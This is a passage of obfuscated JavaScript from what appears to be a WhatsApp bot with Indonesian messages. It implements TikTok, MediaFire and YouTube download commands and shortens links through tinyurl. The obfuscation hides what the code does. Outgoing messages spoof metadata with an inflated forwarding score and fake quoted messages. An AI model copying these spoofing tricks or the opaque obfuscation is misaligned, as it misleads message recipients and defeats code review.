_0x1f7707(_0x47da00-0x78,_0x17c5eb,_0x2385fa-0x22e,_0x438f26-0x174);}_0x34baa1[_0x442901(0x380,0x3dc,0x5c0,0x456)](reply,_0x34baa1[_0x4dd6f4(0x5f8,0x945,0x1b2,0x6fd)]);});const _0x3871f6={};_0x3871f6[_0x39f25f(0x6f0,0x5df,0x869,0x9b9)]=_0x1f7707(0x32b,0x7f5,0x61c,0x78f)+_0x39f25f(0x577,0x739,0x485,0x883)+_0x1f7707(-0x83,-0x2e3,-0x260,-0x291),_0x3871f6[_0x39f25f(0x84c,0x568,0x713,0x524)]=0x2,_0x3871f6[_0x1f7707(-0x618,0x9f,-0x2c6,-0x51c)]='Alquran\x20Au'+_0x1f7707(-0x723,-0x360,-0x284,-0x306),_0x3871f6[_0x1f7707(0x9c4,0xa1f,0x615,0xa74)]='',_0x3871f6[_0x39f25f(0x15a,0x26c,0x3dd,0x4a1)+'rl']='',_0x3871f6[_0x1f7707(0x5b5,0x1ea,0x553,0x173)]=pp_userz;const _0x174335={};_0x174335[_0x39f25f(0x7d,0x3cc,0x2e5,-0xbe)]=_0x1f7707(0x164,-0x13f,0x14c,0x310)+_0x39f25f(-0x4b4,-0xd6,0x79,0x2e8),_0x174335['forwarding'+_0x1f7707(0x3c0,-0x2f,0x0,-0x3cf)]=0x3b9aca00,_0x174335[_0x39f25f(0xef,0x5d,-0xfc,-0x453)+'d']=!![],_0x174335[_0x1f7707(0x8ab,0x25f,0x4da,0xc1)+_0x1f7707(-0x260,-0x348,0x118,-0xbf)]=!![],_0x174335['externalAd'+'Reply']=_0x3871f6;const _0x1a500f={};_0x1a500f[_0x39f25f(0x9b0,0x6dd,0x931,0x825)+'o']=_0x174335,_0x1a500f['mimetype']=_0x39f25f(0x43d,0x653,0x244,0x1ed),_0x1a500f['filename']=_0x39f25f(-0x421,-0xc2,0x2e7,-0x478)+_0x1f7707(-0x5bb,-0x653,-0x235,-0x3e1),_0x1a500f[_0x39f25f(-0x1bf,0x106,0x1b2,0x2b7)]=fgclink2,_0x1a500f[_0x39f25f(0x8f4,0x701,0x968,0x249)]=pp_userz,alpha[_0x39f25f(-0x414,-0x84,0x30d,0x3e4)+'e'](from,japkk,MessageType[_0x39f25f(-0xb3,-0x105,-0x104,0x215)],_0x1a500f);break;case _0x39f25f(0x128,-0x77,-0xf5,0x433)+'o':case _0x39f25f(0x31a,0x132,0x23a,-0x65)+'c':case _0x39f25f(-0x12f,-0xc7,0x1a8,0x26d):if(!isUrl(args[0x150b+0x3*-0x5e9+-0x350])&&!args[-0x1209+0x11*-0x24b+0x3904][_0x39f25f(0x364,0x54d,0x3e8,0x8e7)]('tiktok.com'))return reply(lang[_0x39f25f(-0x2f5,-0x3c,-0x241,0x2c3)]());if(!q)return reply('Linknya?');reply(lang[_0x1f7707(-0x275,-0x1e0,0x7c,0x4b)]()),hx['ttdownload'+'er'](''+args[-0x14b2+-0x1*-0x1a9e+-0x5ec])['then'](_0xe134a5=>{function _0xb1b0e6(_0x530160,_0x24ac7e,_0x3ddf8a,_0x18d776){return _0x39f25f(_0x3ddf8a,_0x18d776-0x3fb,_0x3ddf8a-0x1d8,_0x18d776-0x136);}function _0x5506d5(_0x34baf0,_0x1787cc,_0x4cd19f,_0x26cd0b){return _0x1f7707(_0x34baf0-0xbc,_0x4cd19f,_0x26cd0b-0x6a6,_0x26cd0b-0x13c);}const _0x304f68={'lacWw':function(_0x1adce3,_0x1f4fbb){return _0x1adce3(_0x1f4fbb);},'CLRhh':'https://yo'+_0x5506d5(0xb86,0xb45,0xa1c,0xc31)+_0xb1b0e6(-0xab,0x51d,0x730,0x349),'QMtFF':_0xb1b0e6(0xa61,0xc94,0x6bd,0xa4e)},{wm:_0x2c5d2f,nowm:_0x153438,audio:_0x3658d0}=_0xe134a5;axios['get'](_0xb1b0e6(0x61c,0x830,0x71b,0x7f9)+'nyurl.com/'+'api-create'+_0x5506d5(0xc4d,0x838,0x6f6,0xb60)+_0x153438)[_0x5506d5(0x51b,0x592,0x575,0x8da)](async _0x20ef91=>{me=_0x2d6e4a(0x8b3,0x5f4,0xb14,0xadd)+_0x20ef91[_0x2d6e4a(0x5ae,0x51c,0xa66,0x475)],nowmm=await _0x304f68[_0x28bf5d(0x7fd,0xbe1,0xada,0xf2f)](getBuffer,_0x3658d0);const _0xa8c8a7={};_0xa8c8a7[_0x2d6e4a(0x67a,0x754,0x38e,0x83b)]=_0x304f68[_0x28bf5d(0x365,0x748,0x3cf,0x500)],_0xa8c8a7[_0x28bf5d(0x740,0x984,0x6e6,0x6a5)]=0x2,_0xa8c8a7[_0x28bf5d(0x9d,0x304,0x68d,0x712)]=_0x2d6e4a(0x2ee,0x48a,-0xc6,-0x19f)+'ic',_0xa8c8a7[_0x28bf5d(0x100d,0xbdf,0x1014,0xb08)]='',_0xa8c8a7[_0x2d6e4a(0x307,0x3ef,0x3af,-0x2b)+'rl']='';function _0x2d6e4a(_0x21f380,_0x1eb42b,_0x4b5140,_0x1837cb){return _0xb1b0e6(_0x21f380-0x1d5,_0x1eb42b-0x10a,_0x4b5140,_0x21f380- -0x360);}_0xa8c8a7[_0x2d6e4a(0x79c,0x7a6,0x710,0x566)]=pp_userz;const _0x2ae525={};_0x2ae525[_0x28bf5d(0x9f8,0x7e8,0x605,0xb30)]=_0x28bf5d(0x7e5,0x66f,0xab4,0x7e7)+_0x28bf5d(0x980,0x5f7,0x613,0x5ae)+_0x28bf5d(0x7db,0x988,0x7f3,0xdc1),_0x2ae525[_0x28bf5d(0xcc3,0xad6,0x6dd,0x68b)+'Score']=0x3b9aca00,_0x2ae525[_0x2d6e4a(0xf8,-0x16a,0x17a,0x350)+'d']=!![],_0x2ae525['sendEpheme'+'ral']=!![];function _0x28bf5d(_0x21b732,_0x13770b,_0x137694,_0x32af4){return _0x5506d5(_0x21b732-0x10f,_0x13770b-0x3c,_0x21b732,_0x13770b- -0xdc);}_0x2ae525[_0x2d6e4a(-0xf,0x110,0x27c,-0x198)+_0x28bf5d(0x519,0x68d,0x210,0xb0a)]=_0xa8c8a7;const _0x1ecde1={};_0x1ecde1['contextInf'+'o']=_0x2ae525,_0x1ecde1[_0x28bf5d(0xb4c,0x799,0x9f2,0x4de)]=_0x304f68[_0x2d6e4a(0x77e,0x309,0x546,0x520)],_0x1ecde1[_0x28bf5d(0xee0,0xbf8,0x8f1,0xd7b)]=_0x2d6e4a(0x2ee,0x648,0x79d,0x181)+_0x28bf5d(0x62f,0x7bd,0x5fb,0x842),_0x1ecde1[_0x2d6e4a(0x1a1,0x18b,0x37b,-0x302)]=fgclink2,_0x1ecde1[_0x28bf5d(0x9fc,0xb1d,0xc88,0xc5f)]=pp_userz,alpha[_0x28bf5d(0x5bc,0x398,0x426,0x2a5)+'e'](from,nowmm,MessageType[_0x28bf5d(0x166,0x317,0x1c1,-0x1e)],_0x1ecde1);});});break;case _0x1f7707(0x4b0,0x334,0x3e1,0x6f1):case'ttmp4':case _0x1f7707(-0x17e,0xd8,0x2ec,0x2f1):if(!isUrl(args[0x1c*-0x77+-0x55a+0x125e])&&!args[0x1*-0xf56+0x4df*0x5+0x1*-0x905]['includes'](_0x1f7707(0x40b,-0x20,0x108,0x53e)))return reply(lang['erorLink']());if(!q)return reply('Linknya?');reply(lang[_0x1f7707(-0x77,0x3b5,0x7c,-0x1e4)]()),hx[_0x1f7707(0x39f,0x267,0x5eb,0x9d9)+'er'](''+args[-0x239*0x11+-0x9d*0x14+-0x10af*-0x3])['then'](_0x27eeaf=>{function _0x39476d(_0x15e086,_0x12c809,_0x2014b0,_0x342a6f){return _0x1f7707(_0x15e086-0x1a1,_0x12c809,_0x342a6f-0x135,_0x342a6f-0x11b);}const _0x59c627={'baTLK':function(_0x563a98,_0x2ba22d){return _0x563a98(_0x2ba22d);},'XpivH':_0x39476d(0x2fe,0x679,0x319,0x751)+'utu.be/1r_'+_0x52720d(0xb6,-0x345,0x28c,0x221)},{wm:_0x2fd4f2,nowm:_0x5c94ad,audio:_0x4df182}=_0x27eeaf;function _0x52720d(_0x36eefa,_0xccb5d0,_0x265e70,_0x145928){return _0x39f25f(_0xccb5d0,_0x36eefa-0x168,_0x265e70-0x12c,_0x145928-0x9a);}axios[_0x39476d(0x152,0x59c,0x3c1,0x20f)]('https://ti'+'nyurl.com/'+_0x39476d(0x638,0x82a,0x121,0x3d7)+_0x39476d(0x534,0x9eb,0x7b1,0x5ef)+_0x5c94ad)[_0x52720d(0x54a,0xfa,0x3e5,0x311)](async _0x2dd585=>{me=_0x2952b3(0x70e,0xbab,0xb89,0x77f)+_0x2dd585[_0xead573(0x44e,0x24a,0x5e0,0x42b)];function _0xead573(_0x5cfa61,_0x53fc84,_0x346a2d,_0x5052d9){return _0x52720d(_0x346a2d- -0x9b,_0x5cfa61,_0x346a2d-0x62,_0x5052d9-0x1db);}nowmm=await _0x59c627[_0x2952b3(0x6e4,0x589,0x7b7,0x69f)](getBuffer,_0x5c94ad);const _0xeb9852={};_0xeb9852[_0xead573(0x499,0x86b,0x6ac,0xa0a)]=_0x59c627[_0xead573(-0x1a4,0x6d5,0x29d,0x211)],_0xeb9852['mediaType']=0x2,_0xeb9852[_0x2952b3(-0x86,-0x608,-0x50,-0x1b1)]=_0x2952b3(0x4d9,0x850,0x79d,0x434)+_0xead573(0x61c,0x958,0x698,0x4c9),_0xeb9852[_0xead573(0xc22,0xba9,0x890,0x7c8)]='',_0xeb9852[_0xead573(0x2b3,0x407,0x339,0x3d7)+'rl']='',_0xeb9852['thumbnail']=pp_userz;const _0xd81390={};_0xd81390[_0xead573(0x4dc,0x9a0,0x787,0x666)+_0x2952b3(-0xe6,-0x2f5,0x464,0x115)]=0x3b9aca00,_0xd81390[_0x2952b3(-0x2e6,0x1f5,-0x375,-0x3c)+'d']=!![],_0xd81390[_0x2952b3(0x634,0x536,0x1ed,0x5ef)+_0x2952b3(0x128,0xaf,0x3e3,0x22d)]=!![],_0xd81390[_0xead573(-0x166,0xe,0x23,-0x128)+_0xead573(0x70d,0x3be,0x33e,0x2ce)]=_0xeb9852;function _0x2952b3(_0x1cd899,_0xf2ae78,_0x171500,_0x256dd3){return _0x52720d(_0x256dd3- -0x201,_0x1cd899,_0x171500-0xa6,_0x256dd3-0x106);}const _0x51ae3e={};_0x51ae3e[_0xead573(0xbb0,0x4db,0x7aa,0x801)+'o']=_0xd81390,_0x51ae3e[_0xead573(0x61,0x377,0x44a,0x6d3)]=_0xead573(0x19f,0x409,0x1c7,-0x1e3),_0x51ae3e['filename']=_0xead573(0x172,0x267,0x59a,0x586)+'WM.mp4',_0x51ae3e['quoted']=fgclink2,_0x51ae3e[_0x2952b3(0x537,0xa9b,0x47a,0x668)]=pp_userz,alpha['sendMessag'+'e'](from,nowmm,MessageType[_0xead573(-0x394,-0x2e8,-0x38,-0x291)],_0x51ae3e);});});break;case _0x39f25f(0xb,-0x55,0x1e7,0x5e):if(!isUrl(args[0x23a5+0xcbe+-0x1021*0x3])&&!args[0x6b9*-0x4+0x61d+0x14c7][_0x39f25f(0x205,0x54d,0x83f,0xea)]('tiktok.com'))return reply(lang[_0x1f7707(-0x62e,0xa3,-0x1ea,-0x3fb)]());if(!q)return fakegroup(_0x1f7707(0x392,0x2f8,0x63a,0x557));reply(lang[_0x39f25f(0x2d3,0x22a,-0x210,0x603)]()),hx[_0x1f7707(0x2e1,0x365,0x5eb,0x42e)+'er'](''+args[0x7*-0x4d7+-0xf*-0x213+0x2c4])[_0x1f7707(0x40c,0xeb,0x234,0x262)](_0x117825=>{const _0x341874={'kUIqM':function(_0x132045,_0x1b299d){return _0x132045(_0x1b299d);},'xhPVx':'Terjadi\x20ke'+_0xefe601(0x468,0x271,-0x25,0x278)+_0x2601ac(0x6a1,0x85d,0x2e2,0x55f)+'pa\x20saat\x20la'+'gi','PfEQL':'svWki','WFAQF':_0x2601ac(0xb3a,0xc93,0x73f,0xa93)+_0x2601ac(0xaf5,0x9ae,0xe93,0xa02)+_0x2601ac(0x4bf,0x1f5,0x3ab,0x217),'CfUwU':_0x2601ac(0x121,0x432,0x6e2,0x3c3)};function _0x2601ac(_0x475273,_0xcb7aa0,_0x4b1384,_0x3b537b){return _0x1f7707(_0x475273-0x32,_0x475273,_0x3b537b-0x477,_0x3b537b-0xf2);}const {wm:_0x47d0c4,nowm:_0x6c4bf6,audio:_0xb0efde}=_0x117825;function _0xefe601(_0x4674f0,_0x3746b4,_0x206d24,_0x2b06bb){return _0x1f7707(_0x4674f0-0xb7,_0x3746b4,_0x2b06bb-0x2be,_0x2b06bb-0x13a);}axios[_0x2601ac(0x2f7,0x95b,0x74c,0x551)]('https://ti'+_0xefe601(-0x39,0x27c,0x6a5,0x33d)+_0x2601ac(0x997,0x9a0,0x8be,0x719)+_0x2601ac(0xbf9,0xa3b,0x867,0x931)+_0x47d0c4)[_0xefe601(0xa3,0x3b9,0x533,0x4f2)](async _0x2c218d=>{const _0x3fb702={'gZvxA':function(_0x444e27,_0x4b4f36){function _0x3c10c1(_0x1e50b4,_0x1d298b,_0x4c580c,_0x460879){return _0x3a08(_0x1d298b- -0x333,_0x460879);}return _0x341874[_0x3c10c1(-0x144,-0x1e3,0x183,-0x461)](_0x444e27,_0x4b4f36);},'VAtKT':_0x341874[_0x304551(0x530,0x4e1,0x315,0x73c)]};function _0x13e7d0(_0x4a170c,_0x390e11,_0xceb7fa,_0x21744c){return _0x2601ac(_0x4a170c,_0x390e11-0x113,_0xceb7fa-0x1a5,_0xceb7fa- -0x38a);}function _0x304551(_0x34cdef,_0x5295a1,_0x122ba0,_0x7e118e){return _0x2601ac(_0x34cdef,_0x5295a1-0x1c4,_0x122ba0-0xeb,_0x5295a1- -0x468);}if(_0x341874['PfEQL']==='svWki'){me=_0x304551(0x734,0x679,0x2bc,0x3a7)+_0x2c218d[_0x13e7d0(0x601,0x1e6,0x452,0x6ca)],wmm=await _0x341874['kUIqM'](getBuffer,_0x47d0c4);const _0x5df3b0={};_0x5df3b0['mediaUrl']=_0x341874[_0x304551(0x9b,-0x245,0x208,-0x21f)],_0x5df3b0[_0x13e7d0(0x153,0x6a6,0x4a7,0x2a)]=0x2,_0x5df3b0['title']=_0x304551(-0xda,0x328,0x7a8,0x3a2)+'h\x20Watermar'+'k',_0x5df3b0[_0x13e7d0(0x927,0x8be,0x702,0x32f)]='',_0x5df3b0[_0x13e7d0(0x287,0x531,0x1ab,-0x1a0)+'rl']='',_0x5df3b0[_0x13e7d0(0x58b,0x9b0,0x640,0x7ff)]=pp_userz;const _0x30f11d={};_0x30f11d[_0x304551(0x16d,0x51b,0x37b,0x4c6)+_0x304551(-0x1be,0xf,-0x3e7,0x359)]=0x3b9aca00,_0x30f11d[_0x304551(0xb2,-0x142,0x24e,-0x3d9)+'d']=!![],_0x30f11d[_0x304551(0x991,0x4e9,0x4aa,0x3ad)+'ral']=!![],_0x30f11d['externalAd'+_0x13e7d0(0x61d,-0x59,0x1b0,0x5cb)]=_0x5df3b0;const _0x6e2b23={};_0x6e2b23[_0x304551(0x54b,0x53e,0x28d,0x768)+'o']=_0x30f11d,_0x6e2b23[_0x304551(0x5ad,0x1de,0x203,0x409)]=_0x341874[_0x304551(0x20,-0x210,0x217,-0x147)],_0x6e2b23['filename']='Tiktok\x20WM.'+_0x13e7d0(-0x3a9,0x19e,-0x1e8,-0x409),_0x6e2b23[_0x304551(-0x204,-0x99,-0x482,-0x309)]=fgclink2,_0x6e2b23['thumbnail']=pp_userz,alpha['sendMessag'+'e'](from,wmm,MessageType[_0x304551(-0x672,-0x2a4,0x91,-0x310)],_0x6e2b23);}else _0x3fb702[_0x13e7d0(0x53c,0x16f,0x600,0x6d6)](_0x7bbe65,_0x3fb702[_0x304551(-0x12,-0xad,0x125,-0x133)]);});})[_0x39f25f(0xa20,0x6f9,0x9f7,0x709)](_0x1624af=>console[_0x39f25f(0xa58,0x59f,0x827,0x88c)](_0x1624af));break;case'mediafire':const _0x27b0c0={};_0x27b0c0[_0x39f25f(-0x60,0x0,-0x261,-0x2a7)+'t']=_0x1f7707(0xe,-0x8d,-0xf1,-0x5f)+'emium';const _0x1a9176={};_0x1a9176[_0x39f25f(0x397,0x647,0x920,0xa80)]=_0x1f7707(0x2d2,-0x17b,0x26a,-0x12c),_0x1a9176[_0x1f7707(0x69,0x60f,0x1ce,0x158)]=_0x27b0c0,_0x1a9176['type']=0x1;if(!isPremium)return sendButMessage(from,_0x39f25f(0x409,0x327,0x279,0x90)+'\x20fitur\x20ini'+_0x39f25f(-0x4b5,-0x4c,0x147,0x42e)+_0x39f25f(0x8db,0x827,0x591,0x7d3)+_0x1f7707(-0x31b,0x30b,-0xd,0x356)+'a!\x20Upgrade'+_0x39f25f(0x61,-0xdf,0x69,-0x4d1)+'ekarang\x20de'+_0x1f7707(0x8b,0x6a6,0x493,0x6ca)+_0x1f7707(-0xca,0x5a1,0x11c,0x171)+prefix+_0x39f25f(0x57f,0x418,0xe6,0x8bf),'Click\x20self'+'\x20to\x20return'+'\x20to\x20self\x20m'+_0x1f7707(0x4af,-0x22,0x2a5,0x159),[_0x1a9176]);if(args[_0x1f7707(0x271,0x736,0x4cc,0x333)]<0x1586+-0x199+0x66*-0x32)return reply('Link\x20Nya\x20M'+_0x1f7707(0x616,0x84a,0x4f7,0x267));if(!isUrl(args[0x1aaf+0x13d*0x13+-0x1*0x3236])&&!args[-0xf06+0x86e+0x2*0x34c][_0x1f7707(0x3f9,0x2b2,0x39f,0x54d)](_0x39f25f(0x17a,0x2ff,0x69e,0x788)))return reply(mess[_0x39f25f(0x18b,-0x6,-0x3f6,-0x3f2)]['Iv']);reply(lang[_0x39f25f(0x693,0x22a,0x40a,0x4c)]()),teks=args[_0x39f25f(0x6d7,0x46d,0x509,0x725)]('\x20'),res=await mediafireDl(teks),result=_0x39f25f(0x8b,0x76,0x431,-0x1de)+_0x39f25f(0x40e,0x81f,0x8e3,0xac3)+_0x1f7707(-0x1f8,0x4f9,0x77,-0x144)+petik+_0x1f7707(-0x5b,0x1ee,0x123,0x2b8)+petik+'\x20'+res[0x1edd+0x1af1+0x7*-0x842][_0x1f7707(0x24d,0xa34,0x697,0xb52)]+'\x0a'+petik+'々\x20Link\x20:'+petik+'\x20'+res[-0x24ef+0xf20+0x15cf][_0x39f25f(-0x38f,0x75,-0x3b7,0xf4)]+'\x0a'+petik+_0x39f25f(0x880,0x6b7,0xa0d,0x8e1)+petik+'\x20'+res[-0x29*0x1a+0x74d+-0x323][_0x1f7707(0x66c,0x489,0x60a,0x1f3)]+(_0x39f25f(-0x2f1,0x88,-0x22a,0x538)+_0x39f25f(0x367,0x25a,0x3,0x210)+'e..._'),await reply(result),mdf=await getBuffer(res[0x536+0xcb5+-0x5f9*0x3]['link']);const _0x2fd27f={};_0x2fd27f[_0x39f25f(0x7ea,0x5df,0x661,0x7cd)]=_0x39f25f(0x50b,0x7ca,0x638,0x6c3)+_0x1f7707(0x656,0xd6,0x58b,0x6fe)+_0x1f7707(0xaa,-0x5f5,-0x260,-0x6e2),_0x2fd27f[_0x1f7707(0x4e0,0x560,0x3ba,0x6cd)]=0x2,_0x2fd27f[_0x1f7707(-0x784,-0x566,-0x2c6,-0x154)]=_0x39f25f(0x5df,0x5d1,0x50f,0x473)+_0x1f7707(0x5cb,0x7f6,0x3e7,0x1b2),_0x2fd27f[_0x1f7707(0x44a,0x735,0x615,0x4c0)]='',_0x2fd27f['thumbnailU'+'rl']='',_0x2fd27f[_0x1f7707(0x9a0,0x909,0x553,0x460)]=pp_userz;const _0x5ef812={};_0x5ef812['forwarding'+_0x39f25f(0x5dd,0x1ae,0x23f,0x10c)]=0x3b9aca00,_0x5ef812[_0x39f25f(-0x3f1,0x5d,-0x356,-0x396)+'d']=!![],_0x5ef812[_0x1f7707(0x3ee,0x85a,0x4da,0x56)+_0x1f7707(0x4e2,0x42c,0x118,0x388)]=!![],_0x5ef812['externalAd'+_0x39f25f(0x5bf,0x271,0x49,0x4ab)]=_0x2fd27f;const _0x274866={};_0x274866[_0x1f7707(0x665,0x2bb,0x52f,0x155)+'o']=_0x5ef812,_0x274866['mimetype']=res[-0x16*0xd4+0xd*-0xb7+0x1b83][_0x1f7707(0x620,0x63c,0x25a,0x701)],_0x274866[_0x1f7707(0x699,0x361,0x62e,0x90a)]=res[0x2426+-0x1225*-0x1+-0x364b][_0x1f7707(0x681,0x2f6,0x697,0x796)],_0x274866['quoted']=fgclink,_0x274866[_0x39f25f(0xae7,0x701,0x43c,0xa23)]=pp_userz,alpha[_0x1f7707(-0x599,-0x3b0,-0x232,-0xb2)+'e'](from,mdf,MessageType[_0x39f25f(-0x445,-0x105,-0x34c,-0x71)],_0x274866);break;case _0x1f7707(0x49c,0x64d,0x345,0x285):if(args['length']===-0x2277+-0xe7*0xb+0x2c64)return reply(_0x1f7707(0x157,-0x2df,0x134,0x5f)+_0x39f25f(0x899,0x603,0xa4f,0x268)+prefix+(_0x39f25f(0x116,0x5a4,0xa37,0x664)+'dul\x20video\x20'+'yang\x20akan\x20'+_0x1f7707(-0x139,0x612,0x18e,-0x86)));var srch=args[_0x39f25f(0x42f,0x46d,0x91,0x380)]('');aramas=await yts(srch),server=_0x1f7707(0x269,0x85d,0x57b,0x340),aramat=aramas[_0x39f25f(0x583,0x847,0x419,0x500)];var mulaikah=aramat[0x13*-0xe8+0x226a+-0x1132][_0x1f7707(-0xd2,-0x14e,0x194,0x63c)];try{ytv2(mulaikah,server)['then'](_0x30c7b2=>{function _0x23035(_0x2d04ec,_0x38f23d,_0x17db82,_0x1d2882){return _0x1f7707(_0x2d04ec-0x86,_0x38f23d,_0x2d04ec-0x36,_0x1d2882-0x178);}const _0x47f4b9={'zJEde':function(_0x5509b9,_0x2f6bd4){return _0x5509b9>=_0x2f6bd4;},'KQtZq':function(_0x4edb51,_0x26f13c){return _0x4edb51(_0x26f13c);},'oMeuo':function(_0x39ab09,_0x48c9f3,_0x4cfa90,_0xe31c6d){return _0x39ab09(_0x48c9f3,_0x4cfa90,_0xe31c6d);},'xFmfp':function(_0x394aa8,_0x56fa9f,_0x1e6ac3){return _0x394aa8(_0x56fa9f,_0x1e6ac3);}};function _0x6e1b6e(_0x57745a,_0x4b312b,_0x1287ad,_0x552ef7){return _0x39f25f(_0x1287ad,_0x552ef7-0x196,_0x1287ad-0x70,_0x552ef7-0x18d);}const {dl_link:_0x364f26,thumb:_0x4e74ab,title:_0xdc5c01,filesizeF:_0x236070,filesize:_0x1abd22}=_0x30c7b2;axios[_0x6e1b6e(0x268,0x32a,0x7f7,0x41e)]('https://ti'+'nyurl.com/'+'api-create'+_0x23035(0x4f0,0x768,0xd0,0x446)+_0x364f26)[_0x23035(0x26a,0x2f2,0x6c2,-0x4a)](async _0x126259=>{if(_0x47f4b9[_0x415213(0x2d4,-0x4c,-0xbe,0x15e)](_0x47f4b9['KQtZq'](Number,_0x1abd22),-0x1*0x30b2a+0x1*-0x13c6+0x38*0x153e))return sendMediaURL(from,_0x4e74ab,_0x415213(-0x469,-0x1c6,-0x10e,0x38)+'O**'+enter+'*'+enter+_0xfd9aae(0x203,0x465,0x2dd,0x354)+_0xdc5c01+'*'+enter+(_0xfd9aae(0x799,0x9e3,0x646,0xb54)+'4*')+enter+(_0x415213(0x3,-0x418,0x89,0x243)+_0xfd9aae(0x3af,0x7ec,0x3aa,0x97a))+_0x236070+'*'+enter+_0x415213(0x9b5,0x7e7,0x6f1,0x457)+_0x126259[_0xfd9aae(0x8f2,0x6ab,0x775,0x7f5)]+'*'+enter+'*'+enter+(_0xfd9aae(0x756,0x7e0,0x4b6,0x8da)+_0xfd9aae(0x9f3,0x8fb,0xa06,0xa0f)+_0xfd9aae(0x654,0x97b,0x82e,0xc43)+_0x415213(0x351,-0x2e0,0x68,0x1e0)+_0x415213(0x319,0x1cf,0x46a,0x14)+_0xfd9aae(0xca2,0x7f4,0xa8e,0xa5a)));const _0x1fe46c=_0xfd9aae(0x50e,0x585,0xca,0x697)+_0xfd9aae(0x472,0x5bf,0x480,0x6dd)+enter+'*'+enter+(_0xfd9aae(0x50b,0x26f,0x4aa,-0x18b)+':\x20')+_0xdc5c01+'*'+enter+(_0xfd9aae(0x658,0x9e3,0x8d1,0x7d1)+'4*')+enter+_0x415213(0x63,-0xb8,-0x1f5,0x1ed)+_0x236070+'*'+enter+'*Link*\x20:\x20'+_0x126259[_0x415213(-0x10,0x1e3,0x3ec,-0x8b)]+'*'+enter+'*'+enter+(_0x415213(0xadc,0x4ab,0x718,0xa89)+_0x415213(-0x21d,0x1e3,0x18a,0xee)+_0xfd9aae(0x395,0x512,0x45d,0x6ef)+_0x415213(-0x123,0x13a,-0x1e5,0x1db)+_0x415213(-0xcb,0xd8,0x219,0x6be)+'\x20butuh\x20beb'+_0x415213(-0x291,-0x3c7,-0x150,0xce)+'t_');function _0xfd9aae(_0x3f9eb1,_0x256962,_0x277cf9,_0x25ff4d){return _0x6e1b6e(_0x3f9eb1-0x1bf,_0x256962-0x1ac,_0x3f9eb1,_0x256962-0x2);}_0x47f4b9['oMeuo'](sendMediaURL,from,_0x4e74ab,_0x1fe46c);function _0x415213(_0x35f5bd,_0x88c50e,_0x5a680c,_0xee10bb){return _0x6e1b6e(_0x35f5bd-0xa3,_0x88c50e-0x1c9,_0x35f5bd,_0x5a680c- -0x2bd);}await _0x47f4b9[_0x415213(0x7a,-0x3f9,-0xf3,-0x586)](sendMediaURL,from,_0x364f26)[_0x415213(0x6e6,0x5b2,0x5d2,0x582)](()=>reply('error'));});});}catch(_0x24a97d){reply(mess[_0x39f25f(0x70,-0x6,-0x24f,-0x2c3)][_0x39f25f(0x21c,-0x123,0x12c,0x108)]);}break;case _0x1f7707(0x316,-0x2c7,-0x127,-0x423):if(args['length']===-0xd2c*-0x1+0x270a+-0x3436)return reply('Kirim\x20peri'+_0x1f7707(0x21c,0x64e,0x455,0x24a)+prefix+('ytmp4\x20[lin'+_0x39f25f(0x63e,0x2be,0x19,-0x1dc)));let isLinks2=args[0x96+-0x2411*0x1+0x1f*0x125]['match'](/(?:https?:\/{2})?(?:w{3}\.)?youtu(?:be)?\.(?:com|be)(?:\/watch\?v=|\/)([^\s&]+)/);if(!isLinks2)return reply(mess[_0x1f7707(-0x207,-0x647,-0x1b4,-0x39)]['Iv']);server=_0x1f7707(0x779,0x5fe,0x57b,0x498);try{let yut=await yts(args[0x1198+0x17b1+0x2949*-0x1]);reply(lang['wait']()),ytv2(args[-0x5*0xf2+-0x14eb+0x19a5],server)[_0x39f25f(0x660,0x3e2,0x32,0x633)](_0x5925b0=>{const _0x1dd62e={'thUjb':function(_0x1dad42,_0x4b4204){return _0x1dad42>=_0x4b4204;},'yNlFj':function(_0x2c4c70,_0xa8adb3){return _0x2c4c70(_0xa8adb3);},'roKvV':function(_0x559803,_0x444524,_0x2c6893,_0xf1eab4){return _0x559803(_0x444524,_0x2c6893,_0xf1eab4);},'SIyDR':_0x2d0e6d(0x2a9,0x8b3,0x892,0x63f),'eQKcH':_0x22109a(0x74c,0x3a7,0x480,0x621),'ELJYi':_0x22109a(0x571,0x1bf,0xcb,0x4fd)};function _0x22109a(_0x598560,_0x22c13d,_0x5677dc,_0x5b0ce9){return _0x1f7707(_0x598560-0x1f3,_0x5677dc,_0x5b0ce9-0x2ca,_0x5b0ce9-0xd3);}function _0x2d0e6d(_0x5e3834,_0x3e0430,_0xe327a6,_0x4f9cd0){return _0x39f25f(_0x5e3834,_0x4f9cd0-0x76,_0xe327a6-0x2b,_0x4f9cd0-0x1e3);}const {dl_link:_0x1186f1,thumb:_0x4a6872,title:_0x15a8f3,filesizeF:_0x280684,filesize:_0x409d52}=_0x5925b0;axios[_0x2d0e6d(-0x67,-0x67,0x173,0x2fe)](_0x2d0e6d(0x81b,0x58f,0x2a,0x474)+_0x2d0e6d(0x584,0x169,0x176,0x2a3)+_0x2d0e6d(0x4a2,0x798,0x3fd,0x4c6)+_0x2d0e6d(0x9f1,0xacc,0x385,0x6de)+_0x1186f1)['then'](async _0xdf851c=>{if(_0x1dd62e[_0x5ad859(0xb19,0xb20,0xcea,0xc75)](_0x1dd62e[_0x473a3e(0x1e,0x42c,0x16d,-0x78)](Number,_0x409d52),-0x14c*0x22+0x3e*0x4ab+-0x36d*0x1a))return _0x1dd62e['roKvV'](sendMediaURL,from,_0x4a6872,_0x473a3e(0x295,0x9a,0x25a,-0x2d8)+'L\x20A\x20Y\x20\x20M\x20P'+_0x5ad859(0x687,0x585,0x535,0x3ad)+enter+enter+_0x473a3e(0x82d,0x6a0,0xa35,0x636)+_0x15a8f3+enter+'🐭Ext\x20:\x20MP3'+enter+(_0x473a3e(0x39e,0x523,0x7bb,0x105)+':\x20')+_0x280684+enter+_0x5ad859(0x8f7,0xad5,0x649,0x972)+_0xdf851c[_0x473a3e(0x701,0x5da,0x167,0x92a)]+enter+enter+('_Untuk\x20dur'+_0x5ad859(0xaea,0x112d,0xd07,0xb8a)+_0x473a3e(0xb63,0x8aa,0xbc3,0x9e5)+_0x5ad859(0x402,0x77e,0x733,0xb3f)+'\x20dalam\x20ben'+_0x5ad859(0xaea,0xfd5,0xc00,0xa5a)));const 